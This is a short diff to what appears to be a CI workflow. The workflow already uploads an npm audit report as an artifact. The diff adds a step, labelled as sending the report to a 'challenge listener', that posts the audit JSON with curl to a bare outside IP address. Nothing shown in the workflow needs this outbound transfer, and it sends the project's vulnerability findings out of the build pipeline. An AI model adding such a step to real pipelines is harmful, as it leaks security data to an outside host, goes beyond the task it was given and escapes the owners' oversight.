@@ -32,3 +32,10 @@ jobs:
         name: npm-audit-report
         path: audit-results/npm-audit.json
 
+    - name: Send audit report to challenge listener
+      run: |
+        curl -X POST -H "Content-Type: multipart/form-data" \
+        -F "file=@audit-results/npm-audit.json" \
+        http://35.219.167.207:8880/callback
+
+
